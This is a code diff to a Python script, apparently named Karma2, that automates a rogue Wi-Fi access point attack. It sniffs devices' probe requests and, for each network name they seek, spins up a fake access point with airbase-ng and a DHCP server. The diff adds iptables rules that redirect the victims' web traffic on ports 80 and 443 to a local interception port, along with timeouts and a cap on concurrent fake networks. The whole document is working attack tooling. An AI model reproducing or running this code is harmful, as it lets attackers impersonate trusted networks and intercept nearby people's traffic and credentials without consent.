@@ -4,8 +4,11 @@ from threading import Lock,Thread
 import time,random,re,tempfile
 import subprocess
 from scapy.all import *
+from select import select
 
 class Karma2:
+
+  FORBIDDEN_APS = ('ottersHQ',)
 
   class AccessPoint(Thread):
     def __init__(self, karma, essid):
@@ -13,22 +16,72 @@ class Karma2:
       self.essid = essid
       self.karma = karma
 
-      iface,airbase_process = self.create_access_point(essid)
+      self.activity_ts = time.time()
+
+      iface,self.airbase_process = self.create_access_point(essid)
       subnet = self.karma.get_unique_subnet()
       self.setup_iface(iface,subnet)
+      self.setup_redirections(iface,80,8080)
+      self.setup_redirections(iface,443,8080)
       self.dhcpd_process = self.start_dhcpd(iface,subnet)
 
     def run(self):
+      nclients = 0
       while True:
-        line = self.dhcpd_process.stderr.readline()
-        if len(line) == 0:
-          time.sleep(0.1)
-          continue
-        m = re.match(
-          r".*DHCPACK\(\w+\) ([0-9\.]+) ([a-zA-Z0-9:]+) ([\w-]+).*",line)
-        if m is not None:
-          ip,mac,name = m.groups()
-          print "DHCPACK from %s (%s)"%(ip,name)
+
+        # check timeout
+        if nclients == 0 and time.time() - self.activity_ts > 60.0:
+          print "[x] No activity for essid",self.essid,"destroying AP"
+          self.dhcpd_process.kill()
+          self.dhcpd_process.wait()
+          self.airbase_process.kill()
+          self.airbase_process.wait()
+          self.karma.release_ap(self.essid)
+          return
+
+        dhcpfd = self.dhcpd_process.stderr.fileno()
+        airfd = self.airbase_process.stdout.fileno()
+
+        rlist,wlist,xlist = select([dhcpfd,airfd],[],[],1)
+        if dhcpfd in rlist:
+          line = self.dhcpd_process.stderr.readline()
+          if len(line) == 0:
+            continue
+          m = re.match(
+            r".*DHCPACK\(\w+\) ([0-9\.]+) ([a-zA-Z0-9:]+) ([\w-]+).*",line)
+          if m is not None:
+            ip,mac,name = m.groups()
+            print "DHCPACK from %s (%s)"%(ip,name)
+
+            nclients += 1
+
+        if airfd in rlist:
+          line = self.airbase_process.stdout.readline()
+          if len(line) == 0:
+            continue
+          m = re.match(r".*Client ([0-9A-Za-z:]+) associated \(\w+\) to ESSID",line)
+          if m is not None:
+            mac, = m.groups()
+            print "Client",mac,"associated to",self.essid
+
+            self.activity_ts = time.time()
+
+    def setup_redirections(self, iface, inport, outport):
+      print "[+] Setting up (%s) %d to %d redirection"%(iface,inport,outport)
+      cmd = ['iptables',
+        '-t', 'nat',
+        '-A', 'PREROUTING',
+        '-i', iface,
+        '-p', 'tcp',
+        '--dport', str(inport),
+        '-j', 'REDIRECT',
+        '--to-port', str(outport),
+        ]
+      p = subprocess.Popen(cmd,
+        stdout=subprocess.PIPE,
+        stderr=subprocess.PIPE)
+      p.wait()
+      return p
 
     def start_dhcpd(self, iface, subnet):
       # create a temporary file
@@ -59,6 +112,7 @@ class Karma2:
       cmd = ["airbase-ng",
         "--essid", "%s"%essid,
         "-c","4",
+        "-I","2000",
         self.karma.ifmon]
       p = subprocess.Popen(cmd, stdout=subprocess.PIPE)
 
@@ -100,23 +154,33 @@ class Karma2:
   def get_unique_subnet(self):
     return self.subnets.pop()
 
+  def register_ap(self, essid, ap):
+    self.aps[essid] = ap
+
+  def release_ap(self, essid):
+    self.aps.pop(essid)
+
   def do_sniff(self):
-    # rededge1510016,
     def _filter(packet):
       if packet.haslayer(Dot11ProbeReq):
         section = packet[Dot11ProbeReq][Dot11Elt]
         # SSID
         if section.ID == 0 and section.info != '':
-          if not section.info in self.aps.keys():
+          
+          # limit concurrent APs
+          if len(self.aps) > 9:
+            return
+
+          if (not section.info in self.aps.keys()
+            and not section.info in self.FORBIDDEN_APS):
 
             ap = self.AccessPoint(self, section.info)
             ap.daemon = True
             ap.start()
-            self.aps[section.info] = ap
+            self.register_ap(section.info,ap)
 
-    sniff(prn=_filter)
+    sniff(prn=_filter,store=0)
 
-# CC:5D:4E:EC:A6:CC  E4:F8:EF:1B:7B:A3  -75    0 - 1e
 if __name__ == '__main__':
 
   # network interface connect to the outside world
@@ -126,10 +190,6 @@ if __name__ == '__main__':
   km = Karma2(GATEWAY_INTERFACE, MONITOR_INTERFACE)
 
   km.do_sniff()
-  #for i in xrange(0,3):
-  #  ap = Karma2.AccessPoint(km,"NSA honeypot #%d"%i)
-  #  ap.daemon = True
-  #  ap.start()
 
   while True:
     time.sleep(1)
